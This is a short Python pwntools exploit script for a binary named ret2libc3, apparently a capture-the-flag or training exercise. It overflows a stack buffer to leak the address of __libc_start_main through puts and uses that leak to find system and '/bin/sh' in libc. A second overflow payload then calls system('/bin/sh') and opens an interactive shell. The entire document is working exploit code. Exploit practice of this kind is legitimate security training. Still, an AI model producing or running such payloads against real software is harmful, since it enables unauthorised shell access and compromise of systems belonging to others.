from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')
ret2libc3 = ELF('./ret2libc3')
#gdb.attach(sh)
puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']
#print "leak libc_start_main_got addr and return to main again"
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)
#print "get the related addr"
libc_start_main_addr = u32(sh.recv()[0:4])
print (libc_start_main_addr)
libc=ELF('/usr/lib/i386-linux-gnu/libc-2.29.so')
main_sys_addr=libc.symbols['__libc_start_main']-libc.symbols['system']
system_addr=libc_start_main_addr-main_sys_addr
main_binsh_addr=libc.symbols['__libc_start_main']-libc.search('/bin/sh').next()
binsh_addr=libc_start_main_addr-main_binsh_addr
#print "get shell"
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)
sh.interactive()
